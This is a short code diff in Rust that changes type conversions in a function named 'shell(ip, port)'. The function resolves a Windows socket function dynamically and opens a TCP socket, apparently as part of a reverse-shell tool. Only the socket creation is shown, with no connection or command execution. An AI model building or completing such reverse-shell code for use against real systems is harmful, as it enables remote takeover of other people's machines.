@@ -28,8 +28,8 @@ pub fn shell(ip: &str, port: u16) {
     let function = rco_utils::construct_win32_function!(function; [i32, i32, i32, *const WSAPROTOCOL_INFOA, i32, i32]; [SOCKET]);
     let socket = unsafe {
         function(
-            AF_INET.0 as i32,
-            SOCK_STREAM as i32,
+            AF_INET.0.into(),
+            SOCK_STREAM.0,
             IPPROTO_TCP.0,
             ptr::null(),
             0,
